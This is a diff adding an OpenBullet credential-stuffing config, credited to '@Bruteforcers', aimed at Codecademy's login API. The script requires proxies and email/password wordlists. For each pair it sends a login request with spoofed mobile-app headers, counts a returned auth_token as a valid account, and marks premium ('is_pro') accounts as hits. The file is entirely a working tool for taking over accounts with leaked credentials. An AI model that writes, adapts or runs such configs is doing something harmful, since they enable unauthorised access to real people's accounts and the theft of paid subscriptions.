@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Codeacademy",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-08T17:02:57.7786365+00:00",
+  "AdditionalInfo": "",
+  "Author": "@Bruteforcers",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.codecademy.com/login.json " 
+  CONTENT "{\"user\":{\"login\":\"<USER>\",\"password\":\"<PASS>\"},\"mobile-recaptcha-secret\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Pcc-user-agent: cc-mobile-app v1.13.1" 
+  HEADER "Content-Length: 112" 
+  HEADER "Host: www.codecademy.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Login or password" 
+  KEYCHAIN Success OR 
+    KEY "\"auth_token\"" 
+
+PARSE "<SOURCE>" LR "is_pro\":" ",\"" -> VAR "Bruteforcer" 
+
+IF "<Bruteforcer>" Contains "true"
+SET STATUS SUCCESS
+ELSE
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+FUNCTION Translate 
+  KEY "true" VALUE "Premium" 
+  "<Bruteforcer>" -> CAP "Plan " 
+
